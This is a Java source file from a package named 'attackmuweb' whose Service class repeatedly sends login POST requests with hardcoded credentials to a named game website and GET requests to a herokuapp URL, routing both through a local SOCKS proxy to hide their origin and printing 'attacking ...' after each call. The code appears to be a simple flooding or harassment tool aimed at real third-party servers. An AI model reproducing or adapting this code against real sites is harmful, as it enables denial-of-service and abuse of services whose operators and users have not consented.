/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package attackmuweb;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;

public class Service {

    private final String USER_AGENT = "Mozilla/5.0";

    public void sendPost() throws Exception {

        String url = "http://id.mu-saigon.net/DT/";
       
        URL obj = new URL(url);
        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 1080));
        HttpURLConnection con = (HttpURLConnection) obj.openConnection(proxy);

        //add reuqest header
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

        String urlParameters = "login=login&username=dumemaidaw2&password=cailon123&x=82&y=10";

        // Send post request
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();

        int responseCode = con.getResponseCode();

        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();
        System.out.println("attacking ...");

    }

    public void sendGet() throws Exception {
        try {
            String url = "https://googlesheetapi1.herokuapp.com/test";
            URL obj = new URL(url);
            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 1080));

            HttpURLConnection con = (HttpURLConnection) obj.openConnection(proxy);

            //add reuqest header
            con.setRequestProperty("User-Agent", "Mozilla/5.0");
            con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con.setConnectTimeout(16000);
            // Send post request

            int rs = con.getResponseCode();
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(con.getInputStream()));
            in.close();
            System.out.println("attacking ...");

        } catch (MalformedURLException ex) {
            System.out.println("loi");
        } catch (IOException ex) {
            System.out.println("loi");
        }
    }
}
